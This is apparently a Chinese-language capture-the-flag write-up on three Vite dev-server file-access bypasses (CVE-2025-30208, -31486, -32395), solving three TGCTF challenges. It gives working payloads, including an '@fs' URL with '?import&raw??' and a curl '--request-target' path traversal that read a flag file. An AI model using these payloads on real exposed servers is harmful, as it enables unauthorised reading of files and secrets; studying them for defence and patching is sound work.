---
title: "Vite漏洞分析"
description: "Vite漏洞分析-CVE-2025-30208"
date: 2025-06-15
tags:
  - "CVE-2025-30208"
  - "CVE-2025-31486"
  - "CVE-2025-32395"
  - "vite"
authors:
  - "bx"
---
<meta name="referrer" content="no-referrer">

# Vite漏洞分析
主要是 TGCTF 里面出来了三道题，这个漏洞还是非常新的

+ <font style="color:rgb(0,0,0);">CVE-2025-30208</font>

`<font style="color:rgb(31, 35, 40);">@fs</font>`<font style="color:rgb(31, 35, 40);"> 拒绝访问 Vite 服务允许列表之外的文件。将 </font>`<font style="color:rgb(31, 35, 40);">?raw??</font>`<font style="color:rgb(31, 35, 40);"> 或 </font>`<font style="color:rgb(31, 35, 40);">?import&raw??</font>`<font style="color:rgb(31, 35, 40);"> 添加到 URL 中可以绕过此限制，如果存在则返回文件内容。这种绕过存在是因为在多个地方删除了尾随分隔符（如 </font>`<font style="color:rgb(31, 35, 40);">?</font>`<font style="color:rgb(31, 35, 40);"> ），但未在查询字符串正则表达式中考虑。</font>

[https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w](https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w)

+ <font style="color:rgb(0,0,0);">CVE-2025-31486</font>

<font style="color:rgb(31, 35, 40);">这个是，只有明确将 Vite 开发服务器暴露到网络上的应用程序（使用 --host 或 server.host 配置选项）才会受到影响</font>

[`server.fs.deny` 通过 `.svg` 或相对路径绕过](https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x)

+ <font style="color:rgb(0,0,0);">CVE-2025-32395</font>

[`server.fs.deny` bypassed with an invalid `request-target`](https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4)

<font style="color:rgb(0,0,0);"></font>

## <font style="color:rgb(0,0,0);">调试 Vue</font>
学习到了一个 vue devtools

官网如下：

[Vue DevTools](https://devtools.vuejs.org/)

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744727354800-2928e5dd-2bfa-447c-9bcd-997f324948ee.png)

我就拿这题举例子，在 chrome 下载这个插件

可以清晰的看出来 vue 项目的结构之类的东西

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744727146492-3214e69b-56f6-4658-a38a-3e9b4dd994e3.png)

在`components`可以快捷调试，确实比自己找半天强，还能快捷的梳理版本号和项目结构

具体效果如下





![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744727030500-241e36a6-a6d1-4260-9065-bcd3677282f7.png)

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744727200702-a5b0c156-a898-4331-9d5e-cf8981e2e4c7.png)



## **前端GAME**
https://www.panziye.com/front/16376.html

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744647088442-4bbde74b-f299-4c85-84da-a8e28caac511.png)

关键代码

```bash
const result = (source) => {             if (source > 17) { // <--- 关键条件在这里！                 return `     \u5F53\u524D\u6210\u7EE9\uFF1A${score.value}\u5206     <div class="result">       <img src="@/assets/images/result.png" />       <p>\u606D\u559C\u4F60\u83B7\u5F97\u4E86</p>       <p>\u96EA\u7CD5\u5927\u738B\u79F0\u53F7</p>       <p>flag\u5728\u6839\u76EE\u5F55\u4E0B/tgflagggg\u4E2D</p> // <--- Flag 位置信息！      </div>     `;             } else {                 return `     \u5F53\u524D\u6210\u7EE9\uFF1A${score.value}\u5206     <div class="result">       <img src="@/assets/images/result.png" />       <p>\u83DC\uFF01\uFF01\uFF01</p>     </div>     `;             }         }
   
   
   -------
   
   const result = (source) => {
    if (source > 17) { // <--- 关键条件在这里！
        return `
当前成绩：${score.value}分
<div class="result">
  <img src="@/assets/images/result.png" />
  <p>恭喜你获得了</p>
  <p>雪糕大王称号</p>
  <p>flag在根目录下/tgflagggg中</p> // <--- Flag 位置信息！
</div>
`;
    } else {
        return `
当前成绩：${score.value}分
<div class="result">
  <img src="@/assets/images/result.png" />
  <p>菜！！！</p>
</div>
`;
    }
}
```

http://node2.tgctf.woooo.tech:31048/start.sh

```bash
#!/bin/sh
# 鍚姩 Vite 寮€鍙戞湇鍔″櫒锛堝悗鍙拌繍琛岋級
pnpm dev --host 0.0.0.0 &

echo $FLAG > /tgflagggg
export FLAG="not_flag"
FLAG="not_flag"

httpd -D FOREGROUND

# 淇濇寔瀹瑰櫒杩愯锛堥槻姝㈤€€鍑猴級
tail -f /dev/null
```

最后flag

### Payload
```plain
http://node2.tgctf.woooo.tech:32123/@fs/tgflagggg?import&raw??
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744647088429-b1c1636d-4d47-4d62-b584-12c176821cd1.png)





## **前端GAME Plus**
https://github.com/vitejs/vite/security/advisories/GHSA-xcj6-pq6g-qj4x

```bash
const result = (source) => {
            if (source > 17) {
                return `
    \u5F53\u524D\u6210\u7EE9\uFF1A${score.value}\u5206
    <div class="result">
      <p>\u606D\u559C\u4F60\u83B7\u5F97\u4E86</p>
      <p>\u96EA\u7CD5\u5927\u738B\u79F0\u53F7</p>
      <p>flag\u5728\u6839\u76EE\u5F55\u4E0B/tgflagggg\u4E2D</p>
    </div>
    `;
            } else {
                return `
    \u5F53\u524D\u6210\u7EE9\uFF1A${score.value}\u5206
    <div class="result">
      <p>\u83DC\uFF01\uFF01\uFF01</p>
    </div>
```

![](https://cdn.nlark.com/yuque/0/2025/jpeg/42994824/1744647088522-7a5bbeaa-6568-4dc7-b8fa-3599118d4934.jpeg)

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744647506078-b8c548b0-fe19-42ad-aca1-76c53f6243ec.png)

两种打法都可以

## **前端GAME Ultra**
参考

https://github.com/vitejs/vite/security/advisories/GHSA-356w-63v5-8wf4

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1744647088416-3d7fb5c5-bca7-4254-9d22-b4d6ddb6790f.png)

```plain
┌──(root㉿kali)-[/home/bx]
└─# curl --request-target '/@fs/app/#/../../../tgflagggg' http://node1.tgctf.woooo.tech:32399

TGCTF{3b323bb9-70eb-bb3a-d45a-86aff17f8ef4}
```

